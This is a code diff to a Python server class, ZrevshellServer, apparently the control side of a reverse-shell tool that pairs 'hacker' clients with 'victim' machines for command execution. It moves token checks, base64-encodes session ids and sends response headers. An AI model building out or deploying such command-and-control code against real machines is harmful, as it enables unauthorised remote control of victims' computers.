@@ -301,9 +301,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # If the victim is valid and not already in session with somebody else
         # let's put him in a session with the hacker.
         session_id = self.hacking_sessions.add_session(client_id, victim_id)
+        # Encode the session_id with base64 and turn it to bytes
+        session_id = ut.encode_token(session_id).encode("utf8")
 
         # Finally report the OK message
-        return sh.HandlerResponse(True, HTTPStatus.OK, session_id.encode("utf8"))
+        return sh.HandlerResponse(
+            True, HTTPStatus.OK, session_id, {"Content-Length": str(len(session_id))}
+        )
 
     def execute_command(
         self,
@@ -319,24 +323,25 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         """
         legit_client = False
 
+        hacker_token = self.get_header_token("hacker-token")
+        admin_token = self.get_header_token("admin-token")
+
+        legit_user: dict[str, bool] = {
+            ut.ClientType.Hacker.__str__(): hacker_token is not None
+            and hacker_token == self.config.hacker_token,
+            ut.ClientType.Admin.__str__(): admin_token is not None
+            and admin_token == self.config.admin_token,
+            ut.ClientType.Victim.__str__(): True,
+        }
+
         if get_client_type_from_headers:
             # First get the client_type of the user and check
             # if the user claims match his tokens.
 
             # This is only done the first time, when verifying. after we will
             # look for the user in the database.
+
             client_type = self.headers.get("client-type", None)
-
-            hacker_token = self.get_header_token("hacker-token")
-            admin_token = self.get_header_token("admin-token")
-
-            legit_user = {
-                ut.ClientType.Hacker.__str__(): hacker_token is not None
-                and hacker_token == self.config.hacker_token,
-                ut.ClientType.Admin.__str__(): admin_token is not None
-                and admin_token == self.config.admin_token,
-                ut.ClientType.Victim.__str__(): True,
-            }
 
             if client_type is not None and legit_user.get(client_type, False):
                 # Let's check if the client is able to access the server command
@@ -348,11 +353,16 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             # use that to check if the user can access the path it's accessing
             client_type = self.get_client_type_from_db(client_id)
 
+            # Check if the client has needed tokens for it's type
+            has_tokens = legit_user[client_type.__str__()]
+
             # if the client_type is None it means there is no client
             # with the client_id we gave so let's tell the user that
             # he made an unauthorized request.
-            if client_type is not None and self.check_verified_for_cmd(
-                command, client_type
+            if (
+                client_type is not None
+                and self.check_verified_for_cmd(command, client_type)
+                and has_tokens
             ):
                 legit_client = True
 
@@ -374,6 +384,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # HandlerResponse which is easier to maintain.
         if result.successful is True:
             self.send_response(result.res_code)
+            for header, value in result.headers.items():
+                self.send_header(header, value)
             self.end_headers()
         else:
             self.c_send_error(result.res_code)
